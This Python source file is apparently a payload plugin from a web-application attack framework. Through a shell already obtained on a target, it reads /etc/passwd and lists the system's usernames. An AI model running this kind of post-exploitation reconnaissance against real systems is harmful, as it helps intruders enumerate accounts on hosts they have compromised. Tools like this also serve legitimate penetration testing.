import re
from plugins.attack.payloads.base_payload import base_payload

class users_name(base_payload):
    '''
    This payload shows users name
    '''
    def run_read(self):
        result = []
        users = []

        def parse_users_name( etc_passwd ):
            user = re.findall('^(.*?)\:', etc_passwd,  re.MULTILINE)
            if user:
                return user
            else:
                return ''

        passwd = self.shell.read('/etc/passwd')
        if passwd:
            for user in parse_users_name(passwd):
                result.append(str(user))
        if result == [ ]:
            result.append('Users name not found.')
        return result
